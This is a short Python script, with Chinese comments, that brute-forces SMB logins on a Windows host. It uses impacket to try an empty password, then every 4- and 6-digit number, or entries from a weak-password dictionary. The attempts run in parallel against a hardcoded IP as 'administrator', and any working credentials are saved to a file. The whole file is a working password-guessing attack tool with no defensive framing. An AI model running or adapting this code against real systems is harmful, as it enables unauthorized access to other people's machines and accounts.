# -*- coding: utf-8 -*-
# date: 2022/2/24

from impacket.nmb import NetBIOSError
from impacket import smb
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, wait, as_completed
import time


def genpwd():
    """
    生成8位纯数字
    防止多进程爆内存，分批输出
    :return:list
    """
    yield ['']
        # 生成4位数
    yield [f'{i:04}' for i in range(10 ** 4)]
    # 生成6位数
    for i in range(10 ** 1):
        pwds_parts = [f'{i:06}' for i in range((10 ** 5) * i, (10 ** 5) * (i + 1))]
        yield pwds_parts
    # 生成8位数
    # for i in range(10 ** 3):
    #     pwds_parts = [f'{i:08}' for i in range((10 ** 5) * i, (10 ** 5) * (i + 1))]
    #     yield pwds_parts


def pwdfromdict(dicttxt):
    """
    从txt字典读取密码
    每10000个yield一个列表
    :param dicttxt:
    :return: list
    """
    with open(dicttxt) as f:
        lines = [i.strip() for i in f.readlines()]
        i = 0
        while True:
            l = lines[10 ** 5 * i:10 ** 5 * (i + 1)]
            if not l:
                break
            yield l
            i += 1


def smb_login(ip, user, pwd, port=445):
    try:
        client = smb.SMB('*hostname', ip)
        client.login(user, pwd)
        correctpwd = f'{ip}, {user}, {pwd}'
        with open(r"C:\Users\Administrator\Desktop\新建文件夹\1.txt", 'a') as f:
            f.write(correctpwd)
        return correctpwd
    except NetBIOSError as e:
        # print(f'[-] {pwd}')
        # print(e)
        return
    # except:
    #     return


def run(ip, user, pwds):
    """

    :param dic:密码字典，生成或读取txt
    :param ip:ip
    :param user:用户名
    :return:
    """
    with ProcessPoolExecutor() as pool:
        for pwds_parts in pwds:
            t0 = time.time()
            tasks = [pool.submit(smb_login, ip, user, pwd) for pwd in pwds_parts]
            results = as_completed(tasks)
            wait(tasks)  # 等上一批结束再提交，不然会爆内存
            print(time.time() - t0)
            if r := [i.result() for i in results if i.result()]:
                print(r)
                break
            # 子进程如果找到结果，先写入文件，然后每一批运行结束后主进程读一下文件有没有结果，有就停止
            #  靠这种方法停止程序，因为子进程无法停止主进程，也不方便传递结果给主进程
            # with open(r"C:\Users\Administrator\Desktop\新建文件夹\1.txt") as f:
            #     line = f.read()
            #     if line != '':
            #         break


if __name__ == '__main__':
    for ip in ['10.1.210.117']:
        for user in ['administrator']:
            for pwds in [genpwd()]:  # , pwdfromdict(r"C:\BaiduNetdiskDownload\dict\经典弱密\合并多个弱密码字典.txt")]:
                run(ip, user, pwds)

